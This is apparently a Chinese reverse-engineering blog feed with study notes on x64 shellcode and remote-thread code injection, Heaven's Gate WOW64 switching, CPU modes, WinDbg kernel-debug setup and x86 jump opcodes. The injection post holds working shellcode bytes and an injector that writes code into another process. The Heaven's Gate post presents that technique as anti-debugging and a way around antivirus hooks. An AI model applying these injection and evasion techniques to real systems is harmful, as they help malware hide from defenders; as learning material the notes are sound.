0x00007FFD20BC3C30;</span></span><br><span class="line"><span class="string">code:</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">lea rcx,[rip + rip - user32];</span></span><br><span class="line"><span class="string">mov rax,[rip + rip - pLoadLibraryA];</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">mov rcx,rax;</span></span><br><span class="line"><span class="string">lea rdx,[rip + rip - messageboxa];</span></span><br><span class="line"><span class="string">mov rax,[rip + rip - pGetProcessAddress];</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">lea rbx,[rip + rip - message];</span></span><br><span class="line"><span class="string">mov r9,1;</span></span><br><span class="line"><span class="string">mov r8,rbx;</span></span><br><span class="line"><span class="string">mov rdx,rbx;</span></span><br><span class="line"><span class="string">mov rcx, 0;</span></span><br><span class="line"><span class="string">call rax;</span></span><br><span class="line"><span class="string">ret;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pasm</span>(<span class="params">code_list</span>):</span><br><span class="line">    code_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    code_str += <span class="string">&#x27;__asm&#123;\n&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> code_list:</span><br><span class="line">        code_str += <span class="string">f&quot;_emit 0x<span class="subst">&#123;<span class="built_in">hex</span>(num)[<span class="number">2</span>:].zfill(<span class="number">2</span>)&#125;</span>;\n&quot;</span></span><br><span class="line">    code_str += <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(code_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line">outcode,count = ks.asm(code)</span><br><span class="line"></span><br><span class="line">phex(outcode)</span><br><span class="line"><span class="comment"># pasm(outcode)</span></span><br></pre></td></tr></table></figure><p>这段汇编总能出现一些奇怪的bug，要注意栈平衡和调用函数时栈最后一位为0，lea和mov什么时候传值什么时候传地址，以及x64下的基本调用方式。不管我写没写后面的pop，程序都会崩溃不知道为什么，但是messagebox确实弹出了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">injectCodeAsm</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line">BYTE code[] = &#123; <span class="number">0xeb</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x2e</span>, <span class="number">0x64</span>, <span class="number">0x6c</span>, <span class="number">0x6c</span>, <span class="number">0x00</span>, <span class="number">0x4d</span>, <span class="number">0x65</span>, <span class="number">0x73</span>, <span class="number">0x73</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x42</span>, <span class="number">0x6f</span>, <span class="number">0x78</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x43</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x53</span>, <span class="number">0x53</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x94</span>, <span class="number">0xbc</span>, <span class="number">0x20</span>, <span class="number">0xfd</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x30</span>, <span class="number">0x3c</span>, <span class="number">0xbc</span>, <span class="number">0x20</span>, <span class="number">0xfd</span>, <span class="number">0x7f</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x0d</span>, <span class="number">0xc8</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x05</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x15</span>, <span class="number">0xc0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x05</span>, <span class="number">0xd5</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0x1d</span>, <span class="number">0xbc</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x49</span>, <span class="number">0xc7</span>, <span class="number">0xc1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xd8</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xda</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd0</span>, <span class="number">0xc3</span> &#125;;</span><br><span class="line">LPVOID pcode = <span class="built_in">writeMemory</span>(hProcess, code, <span class="built_in">sizeof</span>(code));</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pcode, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">DWORD pid;</span><br><span class="line">std::cin &gt;&gt; pid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//pid = atol(argv[1]);</span></span><br><span class="line"><span class="built_in">injectCodeAsm</span>(pid);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">本篇讲解基本的代码注入</summary>
    
    
    
    <category term="逆向工程核心原理" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="代码注入" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>天堂之门研究</title>
    <link href="https://www.pri87.vip/posts/4ca4211.html"/>
    <id>https://www.pri87.vip/posts/4ca4211.html</id>
    <published>2024-12-29T13:49:43.000Z</published>
    <updated>2024-12-30T16:48:12.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="天堂之门">天堂之门</h2><p>在32位进程中，调用32位系统函数的操作是通过WOW64实现的。WOW64在内部转换为64位，然后进行64位DLL的调用，从而实现了在64位机上兼容运行32位的操作。</p><p>在长模式下，段寄存器用作权限和标志的区分<br>使用WinDbg进行调试：</p><p>CS:23-&gt;gdt偏移:4*8 = 20<br>CS:33-&gt;gdt偏移:6*8 = 30</p><p><img src="https://s2.loli.net/2024/12/29/PhAFVyJl6iIqtLv.png" alt="image-20241229225553947"></p><p>可以看出23指向的段描述符的Long位为NL，而33指向的为Lo，说明33指向的是64位区域，23指向的是32位区域</p><p>对于不同的段选择子，CPU会选择对应的机器码解释方式去翻译机器码。<br>在软件上，有对应的32位函数实现32到64的转换然后进入64位的操作系统内核，因为(64位的操作系统一定是64位的，要执行内核代码必须先转为64位执行)</p><h3 id="WOW64">WOW64</h3><p>基本调用流程：<br>32位进程调用32位系统API，其中系统API调用<code>dword ptr fs:[000000C0]</code>，即TEB表偏移C0的WOW32Reserved，第一行代码为jmp     0033:77877009，表明先切换为64位，然后跳转到77877009，位于wow64cpu.dll中，首先保存了环境堆栈，然后切换为64为的堆栈<br>最后通过<code>jmp     qword ptr [r15+rcx*8]</code>执行函数调用，r15为函数表，rcx为偏移</p><p>[<a href="https://bbs.kanxue.com/thread-221236.htm">分享][原创]汇编里看Wow64的原理（浅谈32位程序是怎样在windows 64上运行的？）-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p><h3 id="作用">作用</h3><p>反调试：几乎所有调试器均不能正常调试切换后的代码<br>防钩子：如果杀软只对32位DLL执行了Hook，那么这个方法可以直接绕过32位入口直接调用64位函数。</p><h3 id="实现">实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TO_X64  \</span></span><br><span class="line"><span class="meta">do &#123;               \</span></span><br><span class="line"><span class="meta">__asm push 0x33       \</span></span><br><span class="line"><span class="meta">__asm _emit 0xE8 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm add dword ptr [esp], 5 \</span></span><br><span class="line"><span class="meta">__asm retf            \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWITCH_TO_X86  \</span></span><br><span class="line"><span class="meta">do &#123;               \</span></span><br><span class="line"><span class="meta">__asm _emit 0xE8 <span class="comment">/* call $+5 */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0xC7 <span class="comment">/* mov dword [rsp+4], 0x23 */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x44 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x24 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x04 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x23 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x00 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x83 <span class="comment">/* add dword [rsp], 0xD */</span> \</span></span><br><span class="line"><span class="meta">__asm _emit 0x04 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x24 \</span></span><br><span class="line"><span class="meta">__asm _emit 0x0D \</span></span><br><span class="line"><span class="meta">__asm _emit 0xCB <span class="comment">/* retf */</span> \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>切换为64位时，需要使用64位汇编的立即数，我感觉可以创建几个辅助的64位DLL帮我执行那些函数</p><p>对于反调试的作用，自然是已经实现了，如果要实现不使用WOW64去执行函数，需要以下操作：</p><ul><li>切换进程到64位</li><li>获取gs:[60h]得到PEB</li><li>遍历ldr的InMemoryOrderModuleList找到Ntdll64的模块地址</li><li>在Ntdll中获取需要的函数进行操作</li></ul><p>如果不是Ntdll中的函数，需要找到Ntdll中的LdrLoadDll函数，在64位中执行加载库函数操作，然后取函数地址并执行。</p><p>这个部分汇编写得太恶心了，之后再实现吧QAQ</p>]]></content>
    
    
    <summary type="html">一种反调试技术</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="逆向" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="技能" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="反调试" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
    <category term="天堂之门" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/%E5%8F%8D%E8%B0%83%E8%AF%95/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
    <category term="WOW64" scheme="https://www.pri87.vip/tags/WOW64/"/>
    
  </entry>
  
  <entry>
    <title>win-计算机启动时的模式过渡</title>
    <link href="https://www.pri87.vip/posts/bb94a573.html"/>
    <id>https://www.pri87.vip/posts/bb94a573.html</id>
    <published>2024-12-26T16:47:38.000Z</published>
    <updated>2024-12-30T16:45:35.081Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/673712331">第四章 处理器模式与硬件内存管理(x86_64) - 从零开始开发UEFI引导的64位操作系统内核 - 知乎</a></p><p>本文为上面这个网址的摘抄</p><p><img src="https://s2.loli.net/2024/12/27/Lzi1KnslSqB2hmu.png" alt="image-20241227011304326"></p><h2 id="几种模式">几种模式</h2><h3 id="实模式">实模式</h3><blockquote><p>处理位数被设为16位。在这个模式中，处理器只能访问物理地址的前1MB空间，通过段寄存器左移4位后与一个16位地址相加得到的20位地址访问。</p></blockquote><h3 id="32位实模式">32位实模式</h3><blockquote><p>不开启保护模式的32位模式是不稳定的，处理器只能暂时处于<code>32位实模式</code>的状态，需要开启保护模式才能正常执行32位程序。</p></blockquote><h3 id="保护模式">保护模式</h3><blockquote><p>准备保护模式数据结构后将<code>cr0</code>寄存器的<code>PE</code>标志位置位即可开启。这个“保护模式数据结构”指的是<code>GDT</code>，全局描述符表，表中可以添加<code>段描述符</code>、<code>系统描述符</code>。保护模式下的段寄存器通过访问<code>段描述符</code>确定所在的段，而不是左移4位后直接与地址相加；保护模式有许多硬件直接触发的保护功能，系统描述符用于支持这些功能的触发。此外，保护模式中引入了<code>特权级</code>，<code>0</code>为最高的特权级，<code>3</code>为最低的特权级，越高的特权级，保护功能越弱，程序越容易控制处理器的状态。内核通常在<code>0</code>特权级运行，普通程序通常在<code>3</code>特权级运行。同时，在这个模式中也引入了分页机制（不是必须开启）。32位的基本分页机制使用一级页表进行寻址，能够映射4GB空间，开启<code>PAE</code>后，在原先的以及页表上增加了两级页表，通过类似树状的数据结构使得相同大小的最高级页表能够映射<code>64PB</code>的空间。<code>PAE</code>开启后使用36位物理地址，使得物理地址寻址能力提高到了<code>64GB</code>。</p></blockquote><h3 id="长模式">长模式</h3><blockquote><p>由<code>实模式</code>切换而来的<code>32位保护模式</code>被称为<code>IA-32</code>模式。由于64位模式仅仅是在<code>IA-32</code>模式基础上经过简单的功能增强和修改得到的，所以被称为<code>IA-32e</code>模式。</p><p>主要有这些功能：<code>分页机制</code>、<code>长模式地址扩展（LME）</code>、<code>64位段描述符</code>。<code>长模式地址扩展</code>中为分页机制又增加了一级或两级页表，使用4级或5级页表映射地址空间。同时使用48位物理地址，进一步提高物理地址寻址能力。也因为<code>48位物理地址</code>称为<code>长地址</code>，<code>IA-32e</code>模式又称<code>长模式</code>。由于描述符表中支持<code>32位段描述符</code>和<code>64位段描述符</code>同时存在，所以可以通过暂时关闭<code>LME</code>并修改段寄存器索引的段描述符，进入一种支持32位程序运行的<code>IA-32e</code>的子模式，称为<code>兼容模式</code>。虽然所谓的<code>兼容模式</code>只是<code>IA-32e</code>模式的一种支持32位程序运行的<strong>状态</strong>，但我们依然习惯地称<code>IA-32e的支持64位程序运行的状态</code>和<code>IA-32e的支持32位程序运行的状态</code>为<code>IA-32e</code>的两个子模式<code>长模式</code>和<code>兼容模式</code>。</p></blockquote><h2 id="内存布局">内存布局</h2><h3 id="分段">分段</h3><p>通过段寄存器加偏移的方式索引真实物理地址</p><h3 id="分页">分页</h3><p>存在线性连续的虚拟地址，得到虚拟地址后，通过页表映射到对应的物理地址</p><h3 id="分段-分页">分段+分页</h3><p>通过段寄存器加偏移的方式索引到虚拟内存，通过页表映射到对应的物理内存</p><h3 id="平坦内存模型">平坦内存模型</h3><p>舍弃了大多数分段机制，保留了段寄存器的权限限制能力。在64位下，可以直接用单一段访问整个4G的虚拟内存空间，因此每个段的基址均为0，无限段长，直接用对应权限的段+偏移量索引虚拟地址，然后通过页表映射到对应的物理内存。</p>]]></content>
    
    
    <summary type="html">实模式到保护模式到长模式</summary>
    
    
    
    <category term="知识集" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="win核心" scheme="https://www.pri87.vip/categories/win%E6%A0%B8%E5%BF%83/"/>
    
    <category term="计算机组成原理" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
  </entry>
  
  <entry>
    <title>WinDbg-调试环境搭建</title>
    <link href="https://www.pri87.vip/posts/5c35dd38.html"/>
    <id>https://www.pri87.vip/posts/5c35dd38.html</id>
    <published>2024-12-26T13:59:17.000Z</published>
    <updated>2024-12-26T14:51:42.879Z</updated>
    
    <content type="html"><![CDATA[<h2 id="下载">下载</h2><h3 id="下载Win10镜像">下载Win10镜像</h3><p>略</p><h3 id="下载WinDbg">下载WinDbg</h3><p>链接：<a href="https://pan.baidu.com/s/135mYBWw3S3B9-jkuMrm5Lg">https://pan.baidu.com/s/135mYBWw3S3B9-jkuMrm5Lg</a><br>提取码：w7j5</p><h2 id="安装">安装</h2><p>用VMware安装iso镜像</p><h2 id="配置">配置</h2><p>一开始我使用了pipe和com去连接，但是始终连接不上，如果想用这种方法连接，可以看看这个博客</p><p><a href="https://xchen.cc/post/doubledebug/">搞定Windbg 串口双机调试 - 忆杰的博客 - 专注于软件逆向、调试、反调试、内核开发、硬件虚拟化</a></p><p>注意要让baudrate一样，在设备管理器中选择相同的速率</p><h3 id="NET连接">NET连接</h3><p>ipconfig得到本机ip，假设为127.0.0.1</p><h4 id="虚拟机中">虚拟机中</h4><p>管理员模式输入</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /dbgsettings net hostip:主机ip port:<span class="number">50000</span> key:<span class="number">1.1.1.1</span></span><br></pre></td></tr></table></figure><p>1.1.1.1可以用其它的。</p><p>打开调试：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /<span class="literal">debug</span> <span class="literal">on</span></span><br></pre></td></tr></table></figure><p>打开引导调试：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bcdedit</span> /bootdebug <span class="literal">on</span></span><br></pre></td></tr></table></figure><p>允许测试签名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /set testsigning <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><h4 id="调试机中">调试机中</h4><blockquote><p>打开对应位数的WinDbg</p><p>File -&gt; Kernel Debug</p><p>第一个页面就是NET，port选50000，key填上面写的key</p><p>然后WinDbg应该在等待状态。</p><p>重启虚拟机，即可看到调试启动。</p></blockquote><p>如果是最新版本的WinDbg</p><blockquote><p>文件-&gt;Attach to kernel</p><p>Net，设置端口50000，Key，直接连接</p></blockquote>]]></content>
    
    
    <summary type="html">WinDbg是一个支持调试Windows内核的调试器，本篇介绍调试的环境搭建</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>汇编1-控制转移</title>
    <link href="https://www.pri87.vip/posts/8f1f1d37.html"/>
    <id>https://www.pri87.vip/posts/8f1f1d37.html</id>
    <published>2024-12-26T07:09:46.000Z</published>
    <updated>2024-12-26T14:51:42.878Z</updated>
    
    <content type="html"><![CDATA[<p>汇编是如何实现指令之间的跳转</p><h3 id="指令">指令</h3><ul><li>JMP，跳转指令</li><li>CALL，过程调用指令</li><li>LOOP，循环指令</li></ul><h3 id="段寄存器">段寄存器</h3><ul><li>CS：code segment 指令段寄存器</li><li>DS：data segment 数据段寄存器</li><li>SS：stack segment 栈段寄存器</li><li>ES：不知道英文，但是是辅助段寄存器</li><li>fs,gs：一般存操作系统的线程本地存储</li></ul><h2 id="跳转指令">跳转指令</h2><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>EB <strong>cb</strong></td><td>JMP <strong>rel8</strong></td><td>相对短跳转，位移量相对于下一条指令</td></tr><tr><td>E9 <strong>cw</strong></td><td>JMP <strong>rel16</strong></td><td>相对近跳转，位移量相对于下一条指令</td></tr><tr><td>E9 <strong>cd</strong></td><td>JMP <strong>rel32</strong></td><td>相对近跳转，位移量相对于下一条指令</td></tr><tr><td>FF /4</td><td>JMP <strong>r/m16</strong></td><td>绝对间接近跳转，地址由 <strong>r/m16</strong> 给出</td></tr><tr><td>FF /4</td><td>JMP <strong>r/m32</strong></td><td>绝对间接近跳转，地址由 <strong>r/m32</strong> 给出</td></tr><tr><td>EA <strong>cd</strong></td><td>JMP <strong>ptr16:16</strong></td><td>绝对远跳转，地址由操作数给出</td></tr><tr><td>EA <strong>cp</strong></td><td>JMP <strong>ptr16:32</strong></td><td>绝对远跳转，地址由操作数给出</td></tr><tr><td>FF /5</td><td>JMP <strong>m16:16</strong></td><td>绝对间接远跳转，地址由 <strong>m16:16</strong> 给出</td></tr><tr><td>FF /5</td><td>JMP <strong>m16:32</strong></td><td>绝对间接远跳转，地址由 <strong>m16:32</strong> 给出</td></tr></tbody></table><p>分为三种：</p><ul><li>段内跳转：由本段段寄存器作为基址+偏移的跳转</li><li>相对跳转：由下一条指令地址作为基址+偏移的跳转</li><li>远跳转：由一个段寄存器作为基址+偏移的跳转</li><li>任务切换：略（切换进程/线程）</li></ul><h3 id="条件跳转">条件跳转</h3><table><thead><tr><th>操作码</th><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>77 <strong>cb</strong></td><td>JA <strong>rel8</strong></td><td>高于（CF=0 且 ZF=0）时短跳转</td></tr><tr><td>73 <strong>cb</strong></td><td>JAE <strong>rel8</strong></td><td>高于或等于 (CF=0) 时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JB <strong>rel8</strong></td><td>低于 (CF=1) 时短跳转</td></tr><tr><td>76 <strong>cb</strong></td><td>JBE <strong>rel8</strong></td><td>低于或等于（CF=1 或  ZF=1）时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JC <strong>rel8</strong></td><td>进位 (CF=1) 时短跳转</td></tr><tr><td>E3 <strong>cb</strong></td><td>JCXZ <strong>rel8</strong></td><td>CX 寄存器为 0 时短跳转</td></tr><tr><td>E3 <strong>cb</strong></td><td>JECXZ <strong>rel8</strong></td><td>ECX 寄存器为 0 时短跳转</td></tr><tr><td>74 <strong>cb</strong></td><td>JE <strong>rel8</strong></td><td>等于 (ZF=1) 时短跳转</td></tr><tr><td>7F <strong>cb</strong></td><td>JG <strong>rel8</strong></td><td>大于（ZF=0 且 SF=OF）时短跳转</td></tr><tr><td>7D <strong>cb</strong></td><td>JGE <strong>rel8</strong></td><td>大于或等于 (SF=OF) 时短跳转</td></tr><tr><td>7C <strong>cb</strong></td><td>JL <strong>rel8</strong></td><td>小于 (SF&lt;&gt;OF)  时短跳转</td></tr><tr><td>7E <strong>cb</strong></td><td>JLE <strong>rel8</strong></td><td>小于或等于（ZF=1 或  SF&lt;&gt;OF）时短跳转</td></tr><tr><td>76 <strong>cb</strong></td><td>JNA <strong>rel8</strong></td><td>不高于（CF=1 或 ZF=1）时短跳转</td></tr><tr><td>72 <strong>cb</strong></td><td>JNAE <strong>rel8</strong></td><td>不高于或等于 (CF=1) 时短跳转</td></tr><tr><td>73 <strong>cb</strong></td><td>JNB <strong>rel8</strong></td><td>不低于 (CF=0) 时短跳转</td></tr><tr><td>77 <strong>cb</strong></td><td>JNBE <strong>rel8</strong></td><td>不低于或等于（CF=0 或  ZF=0）时短跳转</td></tr><tr><td>73 <strong>cb</strong></td><td>JNC <strong>rel8</strong></td><td>无进位 (CF=0) 时短跳转</td></tr><tr><td>75 <strong>cb</strong></td><td>JNE <strong>rel8</strong></td><td>不相等 (ZF=0) 时短跳转</td></tr><tr><td>7E <strong>cb</strong></td><td>JNG <strong>rel8</strong></td><td>不大于（ZF=1 或  SF&lt;&gt;OF）时短跳转</td></tr><tr><td>7C <strong>cb</strong></td><td>JNGE <strong>rel8</strong></td><td>不大于或等于 (SF&lt;&gt;OF)  时短跳转</td></tr><tr><td>7D <strong>cb</strong></td><td>JNL <strong>rel8</strong></td><td>不小于 (SF＝OF) 时短跳转</td></tr><tr><td>7F <strong>cb</strong></td><td>JNLE <strong>rel8</strong></td><td>不小于或等于（ZF=0 且  SF=OF）时短跳转</td></tr><tr><td>71 <strong>cb</strong></td><td>JNO <strong>rel8</strong></td><td>不上溢 (OF=0) 时短跳转</td></tr><tr><td>7B <strong>cb</strong></td><td>JNP <strong>rel8</strong></td><td>奇校验 (PF=0) 时短跳转</td></tr><tr><td>79 <strong>cb</strong></td><td>JNS <strong>rel8</strong></td><td>正数时 (SF＝0) 短跳转</td></tr><tr><td>75 <strong>cb</strong></td><td>JNZ <strong>rel8</strong></td><td>不为零 (ZF=0) 时短跳转</td></tr><tr><td>70 <strong>cb</strong></td><td>JO <strong>rel8</strong></td><td>上溢 (OF=1) 时短跳转</td></tr><tr><td>7A <strong>cb</strong></td><td>JP <strong>rel8</strong></td><td>偶校验 (PF=1) 时短跳转</td></tr><tr><td>7A <strong>cb</strong></td><td>JPE <strong>rel8</strong></td><td>偶校验 (PF=1) 时短跳转</td></tr><tr><td>7B <strong>cb</strong></td><td>JPO <strong>rel8</strong></td><td>奇校验 (PF=0) 时短跳转</td></tr><tr><td>78 <strong>cb</strong></td><td>JS <strong>rel8</strong></td><td>负数 (SF=1) 时短跳转</td></tr><tr><td>74 <strong>cb</strong></td><td>JZ <strong>rel8</strong></td><td>为零 (ZF $\leftarrow$ 1) 时短跳转</td></tr><tr><td>0F 87 <strong>cw/cd</strong></td><td>JA <strong>rel16/32</strong></td><td>高于（CF=0 且 ZF=0）时近跳转</td></tr><tr><td>0F 83 <strong>cw/cd</strong></td><td>JAE <strong>rel16/32</strong></td><td>高于或等于 (CF=0) 时近跳转</td></tr><tr><td>0F 82 <strong>cw/cd</strong></td><td>JB <strong>rel16/32</strong></td><td>低于 (CF=1) 时近跳转</td></tr><tr><td>0F 86 <strong>cw/cd</strong></td><td>JBE <strong>rel16/32</strong></td><td>低于或等于（CF=1 或  ZF=1）时近跳转</td></tr><tr><td>0F 82 <strong>cw/cd</strong></td><td>JC <strong>rel16/32</strong></td><td>进位 